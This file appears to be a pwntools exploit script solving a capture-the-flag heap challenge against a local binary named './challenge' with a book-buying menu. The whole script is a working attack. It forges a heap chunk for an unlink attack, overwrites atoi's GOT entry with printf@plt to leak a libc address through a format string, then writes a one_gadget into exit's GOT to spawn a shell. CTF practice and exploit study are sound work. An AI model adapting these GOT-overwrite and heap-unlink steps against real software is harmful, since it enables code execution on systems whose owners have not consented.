from pwn import *

p = process("./challenge")

atoi_got = 0x0602060
exit_got = 0x602068
printf_plt = 0x400680
offset = 0x3c4963

one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]

def buy(desc) : 
    p.sendlineafter("5) Checkout!",str(1))
    p.sendafter("book?",desc)
    
def back(idx) :
    p.sendlineafter("5) Checkout!",str(2))
    p.sendlineafter("return?",str(idx))

def mod(idx,desc) : 
    p.sendlineafter("5) Checkout!",str(3))
    p.sendline(str(idx))
    p.sendafter("book?",desc)


if __name__ == "__main__" : 
    
    name = "hello"
    p.sendlineafter("is your name?",name)
    
    buy("aaaa") #0
    buy("aaaa") #1
    buy("aaaa") #2
    buy("aaaa") #3
    buy("aaaa") #4

    ptr = 0x06021A0
    fd = ptr+(2*8)-0x18
    bk = ptr+(2*8)-0x10
    
    str2 = p64(0)
    str2 += p64(0xf0)
    str2 += p64(fd)
    str2 += p64(bk)
    str2 += "a"*0xd0
    str2 += p64(0xf0)
    mod(2,str2)   #2
    
    back(3)
    
    mod(2,p64(0x0)+p64(atoi_got)+p64(exit_got))
    mod(0,p64(printf_plt))
    
    
    p.sendlineafter("5) Checkout!","2")   #it will choose menu2
    p.sendlineafter("return?","%lx")
    p.recvline()
    leak = int(p.recvline(),16)
    libc = leak-offset 
    log.info(hex(libc))
    
    one = libc + one_gadget[2]
    pause()
    p.sendlineafter("5) Checkout!","22") #it will choose menu3
    p.sendline("")  #it will overwrite array[1] -> exit's got
    p.sendafter("book?",p64(one))
    
    p.sendline("33333333") #it will choose default
    
    
    p.interactive()